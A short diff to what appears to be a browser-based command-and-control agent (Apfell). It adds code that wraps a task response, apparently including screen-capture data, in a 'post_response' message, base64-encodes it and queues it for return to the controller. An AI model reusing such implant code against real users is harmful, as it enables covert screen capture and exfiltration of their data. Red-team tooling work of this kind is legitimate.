@@ -168,7 +168,18 @@ connection.onmessage = function (e) {
                                 let msg = btoa(unescape(encodeURIComponent(final)));
                                 out.push(msg);
                             }
+                            
+                            let outer_response = {
+                                'action':'post_response',
+                                'responses':[response],
+                                'delegates':[]
+                            };
 
+                            let enc = JSON.stringify(outer_response);
+                            let final = apfell.apfellid + enc;
+                            let msg = btoa(unescape(encodeURIComponent(final)));
+                            out.push(msg);
+                            
                             screencaptures[i] = {};
                             if (screencaptures.length === 1 ) {
                                 screencaptures = [];
